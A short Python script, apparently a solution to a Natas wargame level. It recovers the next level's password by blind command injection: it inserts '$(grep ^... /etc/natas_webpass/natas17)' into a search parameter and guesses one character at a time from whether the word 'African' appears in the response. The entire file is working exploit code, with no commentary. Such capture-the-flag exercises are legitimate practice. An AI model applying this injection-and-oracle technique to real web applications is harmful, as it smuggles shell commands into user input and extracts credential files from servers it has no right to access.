import config
import os, re, string
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

allchars = string.ascii_uppercase + string.ascii_lowercase + string.digits
guessed = ""

while len(guessed) != 32:
	for c in allchars:
		print(c)
		guess = guessed + c
		response = post(url, auth=(user, password), params={"needle" : "$(grep ^{} /etc/natas_webpass/natas17)".format(guess)})
		if "African" not in response.content:
			guessed += c
			break
	print(guessed)

print(guessed)
